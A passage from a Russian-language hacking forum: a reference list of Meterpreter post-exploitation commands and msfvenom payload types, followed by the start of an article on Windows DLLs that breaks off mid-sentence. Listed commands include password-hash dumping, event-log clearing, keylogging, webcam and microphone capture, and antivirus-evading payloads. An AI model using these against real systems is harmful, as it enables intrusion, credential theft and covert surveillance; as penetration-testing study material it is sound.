Meterpreter ‚Äî —ç—Ç–æ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π –∏ —Ä–∞—Å—à–∏—Ä—è–µ–º—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è Metasploit –∏ –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –º–Ω–æ–∂–µ—Å—Ç–≤–æ —Ñ—É–Ω–∫—Ü–∏–π –Ω–∞ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –º–∞—à–∏–Ω–µ. –í–æ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–∑ –¥–µ–π—Å—Ç–≤–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å –≤ —Å–µ—Å—Å–∏–∏ Meterpreter:<br />
<ol>
<li data-xf-list-type="ol"><b>–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏</b>:<ul>
<li data-xf-list-type="ul">sysinfo: –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ, –≤–∫–ª—é—á–∞—è –≤–µ—Ä—Å–∏—é –û–°, –∏–º—è —Ö–æ—Å—Ç–∞ –∏ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—É.</li>
<li data-xf-list-type="ul">getuid: –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞ —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.</li>
<li data-xf-list-type="ul">getpid: –ü–æ–ª—É—á–µ–Ω–∏–µ ID —Ç–µ–∫—É—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
<li data-xf-list-type="ul">ps: –ü—Ä–æ—Å–º–æ—Ç—Ä —Å–ø–∏—Å–∫–∞ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.</li>
<li data-xf-list-type="ul">ipconfig: –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–µ—Ç–µ–≤—ã—Ö –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞—Ö.</li>
<li data-xf-list-type="ul">route: –ü—Ä–æ—Å–º–æ—Ç—Ä —Ç–∞–±–ª–∏—Ü—ã –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü–∏–∏.</li>
</ul></li>
<li data-xf-list-type="ol"><b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º–æ–π</b>:<ul>
<li data-xf-list-type="ul">ls: –ü—Ä–æ—Å–º–æ—Ç—Ä —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏.</li>
<li data-xf-list-type="ul">cd: –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏.</li>
<li data-xf-list-type="ul">upload –∏ download: –ó–∞–≥—Ä—É–∑–∫–∞ –∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –º–µ–∂–¥—É –≤–∞—à–µ–π –º–∞—à–∏–Ω–æ–π –∏ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–æ–π.</li>
<li data-xf-list-type="ul">cat: –ß—Ç–µ–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Ñ–∞–π–ª–∞.</li>
<li data-xf-list-type="ul">edit: –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞.</li>
<li data-xf-list-type="ul">rm: –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞.</li>
</ul></li>
<li data-xf-list-type="ol"><b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏</b>:<ul>
<li data-xf-list-type="ul">migrate PID: –ü–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ Meterpreter –≤ –¥—Ä—É–≥–æ–π –ø—Ä–æ—Ü–µ—Å—Å (–≥–¥–µ PID ‚Äî —ç—Ç–æ ID –ø—Ä–æ—Ü–µ—Å—Å–∞).</li>
<li data-xf-list-type="ul">kill: –£–±–∏–π—Å—Ç–≤–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
</ul></li>
<li data-xf-list-type="ol"><b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–µ—Ç—å—é</b>:<ul>
<li data-xf-list-type="ul">portfwd: –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏ –ø–æ—Ä—Ç–æ–≤.</li>
<li data-xf-list-type="ul">netstat: –ü—Ä–æ—Å–º–æ—Ç—Ä –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Ç–µ–≤—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π.</li>
</ul></li>
<li data-xf-list-type="ol"><b>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ —Å–∏—Å—Ç–µ–º–µ</b>:<ul>
<li data-xf-list-type="ul">shell: –ó–∞–ø—É—Å–∫ –∫–æ–º–∞–Ω–¥–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ –Ω–∞ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ.</li>
<li data-xf-list-type="ul">execute: –ó–∞–ø—É—Å–∫ –∫–æ–º–∞–Ω–¥—ã –∏–ª–∏ –ø—Ä–æ–≥—Ä–∞–º–º—ã –Ω–∞ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ.</li>
</ul></li>
<li data-xf-list-type="ol"><b>–ü—Ä–∏–≤–∏–ª–µ–≥–∏–∏</b>:<ul>
<li data-xf-list-type="ul">getsystem: –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–≤—ã—Å–∏—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –¥–æ SYSTEM.</li>
<li data-xf-list-type="ul">hashdump: –í—ã–≥—Ä—É–∑–∫–∞ —Ö—ç—à–µ–π –ø–∞—Ä–æ–ª–µ–π –∏–∑ —Å–∏—Å—Ç–µ–º—ã.</li>
<li data-xf-list-type="ul">clearev: –û—á–∏—Å—Ç–∫–∞ –∂—É—Ä–Ω–∞–ª–æ–≤ —Å–æ–±—ã—Ç–∏–π.</li>
</ul></li>
<li data-xf-list-type="ol"><b>–í–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ —Å —ç–∫—Ä–∞–Ω–æ–º –∏ –≤–≤–æ–¥–æ–º</b>:<ul>
<li data-xf-list-type="ul">screenshot: –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞.</li>
<li data-xf-list-type="ul">keyscan_start: –ù–∞—á–∞–ª–æ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã.</li>
<li data-xf-list-type="ul">keyscan_dump: –í—ã–≥—Ä—É–∑–∫–∞ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã.</li>
<li data-xf-list-type="ul">keyscan_stop: –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã.</li>
</ul></li>
<li data-xf-list-type="ol"><b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∞—É–¥–∏–æ –∏ –≤–∏–¥–µ–æ</b>:<ul>
<li data-xf-list-type="ul">webcam_list: –°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–∞–º–µ—Ä.</li>
<li data-xf-list-type="ul">webcam_snap: –°–Ω–∏–º–æ–∫ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã.</li>
<li data-xf-list-type="ul">record_mic: –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞.</li>
</ul></li>
<li data-xf-list-type="ol"><b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞–º–∏ –∏ —Å–µ—Å—Å–∏—è–º–∏</b>:<ul>
<li data-xf-list-type="ul">use incognito: –ó–∞–≥—Ä—É–∑–∫–∞ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞–º–∏ –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–µ–π—Å—Ç–≤–∏–π –æ—Ç –∏–º–µ–Ω–∏ –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.</li>
<li data-xf-list-type="ul">list_tokens -u: –ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.</li>
</ul></li>
<li data-xf-list-type="ol"><b>–†–∞–±–æ—Ç–∞ —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è–º–∏</b>:<ul>
<li data-xf-list-type="ul">load &lt;extension_name&gt;: –ó–∞–≥—Ä—É–∑–∫–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –º–æ–¥—É–ª–µ–π –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π.</li>
</ul></li>
</ol>–≠—Ç–æ –ª–∏—à—å –∫—Ä–∞—Ç–∫–∏–π –æ–±–∑–æ—Ä –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π Meterpreter. –ü–æ–º–∏–º–æ —ç—Ç–æ–≥–æ, –µ—Å—Ç—å –º–Ω–æ–∂–µ—Å—Ç–≤–æ –¥—Ä—É–≥–∏—Ö –∫–æ–º–∞–Ω–¥ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–∑–≤–æ–ª—è—é—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –Ω–∞ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞—Ö –∏ –≤ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Å—Ü–µ–Ω–∞—Ä–∏—è—Ö.<br />
–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ø–æ–ª–Ω—ã–π —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ–º–∞–Ω–¥ –≤ Meterpreter, –≤–≤–µ–¥–∏—Ç–µ help –≤ —Å–µ—Å—Å–∏–∏ Meterpreter.<br />
<br />
<b>–í–æ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ç–∏–ø—ã —à–µ–ª–ª–∫–æ–¥–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å —Å –ø–æ–º–æ—â—å—é msvenom:</b><br />
<ol>
<li data-xf-list-type="ol"><b>–û–±—Ä–∞—Ç–Ω—ã–µ –æ–±–æ–ª–æ—á–∫–∏ (Reverse Shells)</b>: –≠—Ç–∏ –ø–µ–π–ª–æ—É–¥—ã —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å –∞—Ç–∞–∫—É—é—â–∏–º –∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—é—Ç –µ–º—É –æ–±–æ–ª–æ—á–∫—É –Ω–∞ –∞—Ç–∞–∫—É–µ–º–æ–π –º–∞—à–∏–Ω–µ. –ü—Ä–∏–º–µ—Ä: windows/meterpreter/reverse_tcp.</li>
<li data-xf-list-type="ol"><b>–ü—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–µ –æ–±–æ–ª–æ—á–∫–∏ (Bind Shells)</b>: –≠—Ç–∏ –ø–µ–π–ª–æ—É–¥—ã —Å–ª—É—à–∞—é—Ç –≤—Ö–æ–¥—è—â–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ –∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—é—Ç –æ–±–æ–ª–æ—á–∫—É, –∫–æ–≥–¥–∞ –∞—Ç–∞–∫—É—é—â–∏–π –ø–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è. –ü—Ä–∏–º–µ—Ä: windows/meterpreter/bind_tcp.</li>
<li data-xf-list-type="ol"><b>–ü–µ–π–ª–æ—É–¥—ã –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π</b>: –°–æ–∑–¥–∞—é—Ç –Ω–æ–≤—É—é —É—á–µ—Ç–Ω—É—é –∑–∞–ø–∏—Å—å –Ω–∞ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ. –ü—Ä–∏–º–µ—Ä: windows/adduser.</li>
<li data-xf-list-type="ol"><b>–ö–æ–º–∞–Ω–¥–Ω—ã–µ –ø–µ–π–ª–æ—É–¥—ã</b>: –í—ã–ø–æ–ª–Ω—è—é—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—É—é –∫–æ–º–∞–Ω–¥—É –Ω–∞ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ. –ü—Ä–∏–º–µ—Ä: cmd/unix/reverse_python.</li>
<li data-xf-list-type="ol"><b>–ü–µ–π–ª–æ—É–¥—ã –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è</b>: –°–∫–∞—á–∏–≤–∞—é—Ç –∏ –≤—ã–ø–æ–ª–Ω—è—é—Ç —Ñ–∞–π–ª —Å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ URL. –ü—Ä–∏–º–µ—Ä: windows/download_exec.</li>
<li data-xf-list-type="ol"><b>–ü–µ–π–ª–æ—É–¥—ã –¥–ª—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è –∏–ª–∏ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏</b>: –ü—Ä–∏–º–µ—Ä: windows/shutdown.</li>
<li data-xf-list-type="ol"><b>Metsvc (Meterpreter Service)</b>: –°–æ–∑–¥–∞–µ—Ç –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–π —Å–µ—Ä–≤–∏—Å Meterpreter –Ω–∞ —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ.</li>
<li data-xf-list-type="ol"><b>Payloads –¥–ª—è —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º</b>: msvenom –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –º–Ω–æ–∂–µ—Å—Ç–≤–æ –ø–ª–∞—Ç—Ñ–æ—Ä–º, –≤–∫–ª—é—á–∞—è Windows, Linux, macOS, Android, –∏ –¥—Ä—É–≥–∏–µ.</li>
<li data-xf-list-type="ol"><b>–ò–Ω—ä–µ–∫—Ü–∏–∏ –≤ –ø–∞–º—è—Ç—å</b>: –ü–µ–π–ª–æ—É–¥—ã, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∏–Ω–∂–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω—ã –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –≤ –ø–∞–º—è—Ç—å –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω—ã –±–µ–∑ –∑–∞–ø–∏—Å–∏ –Ω–∞ –¥–∏—Å–∫.</li>
<li data-xf-list-type="ol"><b>–ü–µ–π–ª–æ—É–¥—ã –¥–ª—è –æ–±—Ö–æ–¥–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–≤</b>: –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –ø–µ–π–ª–æ—É–¥—ã –º–æ–≥—É—Ç –±—ã—Ç—å —Å–æ–∑–¥–∞–Ω—ã —Ç–∞–∫, —á—Ç–æ–±—ã –æ–±—Ö–æ–¥–∏—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–µ —Ä–µ—à–µ–Ω–∏—è –∏–ª–∏ –∏—Ö —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏.</li>
<li data-xf-list-type="ol"><b>–ò –º–Ω–æ–≥–∏–µ –¥—Ä—É–≥–∏–µ...</b></li>
</ol>–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ø–æ–ª–Ω—ã–π —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–µ–π–ª–æ—É–¥–æ–≤ –≤ msvenom, –≤—ã –º–æ–∂–µ—Ç–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—å:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msvenom --list payloads</code></pre>
	</div>
</div><br />
–î–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —à–µ–ª–ª–∫–æ–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ñ–æ—Ä–º–∞—Ç–µ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msvenom -p [payload] [options]</code></pre>
	</div>
</div><br />
–ì–¥–µ [payload] - —ç—Ç–æ –∏–º—è –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –ø–µ–π–ª–æ—É–¥–∞, –∞ [options] - —ç—Ç–æ —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, —Ç–∞–∫–∏–µ –∫–∞–∫ IP-–∞–¥—Ä–µ—Å, –ø–æ—Ä—Ç, —Ñ–æ—Ä–º–∞—Ç –≤—ã–≤–æ–¥–∞ –∏ –¥—Ä—É–≥–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, –∑–∞–≤–∏—Å—è—â–∏–µ –æ—Ç –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –ø–µ–π–ª–æ—É–¥–∞.<br />
<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, msvenom –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –≥–∏–±–∫–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ä–∞–∑–Ω–æ–æ–±—Ä–∞–∑–Ω—ã—Ö —à–µ–ª–ª–∫–æ–¥–æ–≤ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤–∞—à–∏—Ö –ø–æ—Ç—Ä–µ–±–Ω–æ—Å—Ç–µ–π.</div>
						

							<h2>–ò–∑—É—á–∞–µ–º –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746731860013.png"
		data-src="https://osint42.org/attachments/1746731860013-png.43/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731860013-png.43/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731860013.png"
			title="1746731860013.png"
			width="600" height="600" loading="lazy" />
	</div><br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –ø—Ä–µ–¥–ª–∞–≥–∞—é —Ä–∞—Å—Å–º–æ—Ç—Ä–µ—Ç—å —Å–æ–∑–¥–∞–Ω–∏–µ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫, –≤ –≤–∏–Ω–¥–µ —ç—Ç–æ –≤—Å–µ–º –Ω–∞–≤–µ—Ä–Ω–æ–µ –∏–∑–≤–µ—Å—Ç–Ω—ã–µ DLL.)<br />
<br />
–ò .exe, –∏ .dll —Ñ–∞–π–ª—ã —Å—á–∏—Ç–∞—é—Ç—Å—è –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏, –≤ —Ñ–æ—Ä–º–∞—Ç–µ PE, —Å–∞–º PE —É–∂–µ –æ–ø–∏—Å–∞–Ω –º–Ω–æ–≥–æ –≥–¥–µ, –Ω–µ—Ç –Ω–µ –≤—Ä–µ–º–µ–Ω–∏ –Ω–µ –∂–µ–ª–∞–Ω–∏–µ –æ–ø–∏—Å—ã–≤–∞—Ç—å –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—É, –µ—Å–ª–∏ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ –≤—Å—ë –≤ —Å–µ—Ç–∏ –µ—Å—Ç—å –∏ –æ—á–µ–Ω—å —Ä–∞–∑–∂–æ–≤–∞–Ω–Ω–æ.)<br />
<br />
<b>–ß—Ç–æ —Ç–∞–∫–æ–µ DLL?</b><br />
<br />
DLL - —ç—Ç–æ –æ–±—â–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –∏–ª–∏ –¥–∞–Ω–Ω—ã—Ö, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –Ω–µ—Å–∫–æ–ª—å–∫–∏–º–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ. –û–Ω–∏ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è —ç–∫—Å–ø–æ—Ä—Ç–∞ —Ñ—É–Ω–∫—Ü–∏–π, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –ø—Ä–æ—Ü–µ—Å—Å–æ–º. –í –æ—Ç–ª–∏—á–∏–µ –æ—Ç EXE —Ñ–∞–π–ª–æ–≤, DLL —Ñ–∞–π–ª—ã –Ω–µ –º–æ–≥—É—Ç –∏—Å–ø–æ–ª–Ω—è—Ç—å –∫–æ–¥ —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ. –í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ DLL –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥—Ä—É–≥–∏–º–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞–º–∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä —Ñ—É–Ω–∫—Ü–∏—è createFile —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∞ –∏–∑ kernel32.dll, –ø–æ—ç—Ç–æ–º—É –µ—Å–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å —Ö–æ—á–µ—Ç –≤—ã–∑–≤–∞—Ç—å —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é, –µ–º—É —Å–Ω–∞—á–∞–ª–∞ –Ω—É–∂–Ω–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å kernel32.dll –≤ —Å–≤–æ–µ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ.<br />
<br />
–ù–µ–∫–æ—Ç–æ—Ä—ã–µ DLL –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è –≤ –∫–∞–∂–¥—ã–π –ø—Ä–æ—Ü–µ—Å—Å –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–∏ DLL —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É—é—Ç —Ñ—É–Ω–∫—Ü–∏–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
–ù–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–∏–º–µ—Ä–æ–≤ —Ç–∞–∫–∏—Ö DLL: ntdll.dll, kernel32.dll –∏ kernelbase.dll.<br />
<br />
–í PocessExplorer –ø–æ–∫–∞–∑–∞–Ω–Ω–æ –∫–∞–∫–∏–µ dll –∑–∞–≥—Ä—É–∂–µ–Ω—ã –≤ –ø—Ä–æ—Ü–µ—Å—Å explorer.exe:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731873179.png"
		data-src="https://osint42.org/attachments/1746731873179-png.44/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731873179-png.44/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731873179.png"
			title="1746731873179.png"
			width="699" height="357" loading="lazy" />
	</div><br />
<br />
<b>–°–∏—Å—Ç–µ–º–Ω—ã–π –ë–∞–∑–æ–≤—ã–π –ê–¥—Ä–µ—Å DLL</b><br />
<br />
–û–° Windows –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–π –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å DLL, —á—Ç–æ–±—ã –∑–∞–≥—Ä—É–∂–∞—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ DLL –ø–æ –æ–¥–Ω–æ–º—É –∏ —Ç–æ–º—É –∂–µ –±–∞–∑–æ–≤–æ–º—É –∞–¥—Ä–µ—Å—É –≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–º –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –≤—Å–µ—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –Ω–∞ –¥–∞–Ω–Ω–æ–π –º–∞—à–∏–Ω–µ –¥–ª—è –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø–∞–º—è—Ç–∏ –∏ —É–ª—É—á—à–µ–Ω–∏—è 